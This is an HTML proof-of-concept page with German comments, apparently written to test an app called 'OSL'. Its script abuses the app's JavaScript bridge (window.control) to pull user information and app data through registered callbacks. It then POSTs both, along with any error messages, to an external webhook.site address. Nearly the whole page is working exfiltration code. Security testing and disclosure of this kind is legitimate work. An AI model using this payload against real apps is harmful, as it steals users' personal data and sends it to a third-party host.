<body>
    <h1>OSL App Security PoC - Callback Modus</h1>

    <script>
        alert("Exploit v2 geladen!");

        // Callback-Funktionen registrieren
        window.handleUserInfo = function(data) {
            fetch('https://webhook.site/a594f57c-870b-4141-9432-dde76c31be3d', {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({ event: "userInfo_success", payload: data })
            });
        };

        window.handleAppData = function(data) {
            fetch('https://webhook.site/a594f57c-870b-4141-9432-dde76c31be3d', {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({ event: "appData_success", payload: data })
            });
        };

        // Aufruf der Bridge mit Übergabe des Funktionsnamens als String
        try {
            if (window.control) {
                window.control.getUserInfo("handleUserInfo");
                window.control.getAppData("handleAppData");
            }
        } catch(e) {
            fetch('https://webhook.site/a594f57c-870b-4141-9432-dde76c31be3d?error=' + encodeURIComponent(e.message));
        }
    </script>
